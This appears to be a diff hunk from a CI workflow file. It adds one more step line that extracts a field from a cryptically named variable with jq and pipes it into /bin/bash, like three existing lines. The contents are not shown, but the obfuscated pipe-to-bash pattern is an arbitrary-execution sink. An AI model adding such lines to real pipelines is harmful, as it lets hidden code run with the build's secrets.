@@ -34,6 +34,7 @@ jobs:
           echo $xyd4 | jq -r .mpflx229 | /bin/bash
           printf '%s' "$a33457" | jq -r .u96 | /bin/bash
           printf '%s' "$opgfn69848" | jq -r .q2 | /bin/bash
+          printf '%s' "$cm014" | jq -r .cvv110 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
